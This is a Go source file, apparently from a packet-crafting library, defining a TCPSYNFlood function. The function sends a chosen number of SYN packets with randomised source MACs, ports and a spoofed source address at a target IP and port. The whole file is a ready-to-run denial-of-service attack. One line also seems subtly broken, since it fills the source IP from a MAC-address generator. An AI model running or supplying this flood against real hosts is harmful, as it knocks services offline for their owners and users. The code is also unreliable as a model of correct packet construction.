package higherlevel

import (
	golayers "github.com/google/gopacket/layers"
	"github.com/tiagomdiogo/ScaGo/packet"
	communication "github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
)

func TCPSYNFlood(iface, targetIP, targetPort string, numberOfPackets int) {

	for i := 0; i < numberOfPackets; i++ {
		ethLayer := packet.EthernetLayer()
		ethLayer.SetEthernetType(golayers.EthernetTypeIPv4)
		ethLayer.SetSrcMAC(utils.ParseMACGen())
		ethLayer.SetDstMAC(utils.ParseMACGen())

		ipLayer := packet.IPv4Layer()
		ipLayer.SetSrcIP(utils.ParseMACGen())
		ipLayer.SetDstIP(targetIP)

		tcpLayer := packet.TCPLayer()
		tcpLayer.SetSrcPort(utils.RandomPort())
		tcpLayer.SetDstPort(targetPort)
		tcpLayer.SetSyn()
		tcpLayer.Layer().SetNetworkLayerForChecksum(ipLayer.Layer())

		completePacket, _ := packet.CraftPacket(ethLayer.Layer(), ipLayer.Layer(), tcpLayer.Layer())
		communication.Send(completePacket, iface)
	}
}
